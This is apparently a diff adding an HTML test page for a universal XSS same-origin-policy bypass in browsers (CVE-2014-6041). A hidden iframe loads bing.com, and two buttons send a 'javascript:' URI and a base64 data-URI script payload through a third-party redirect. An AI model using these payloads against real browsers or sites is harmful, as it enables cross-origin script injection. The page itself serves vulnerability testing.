@@ -1,0 +1,70 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+<iframe height="0" width="0" name="CVE-2014-6041" src="http://www.bing.com" style="display:none;"></iframe>
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 13</h3>	
+
+		<div class="main">
+				<p>SOP Bypass test case based upon 302 server side redirects</p>
+		</div>
+		
+		<center>	<a href="http://innerht.ml/re.php?xss=javascript:alert(document.domain)"><input type="button" id="btn_test" class="test" value="Run Test Case 1"  /></center></br>
+		<center>	<a href="http://innerht.ml/re.php?xss=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ"><input type="button" id="btn_test" class="test" value="Run Test Case 2"  /></center>
+
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+					If page redirects and displays and alert box from origin of innerht.ml, it has resulted in a SOP Bypass
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
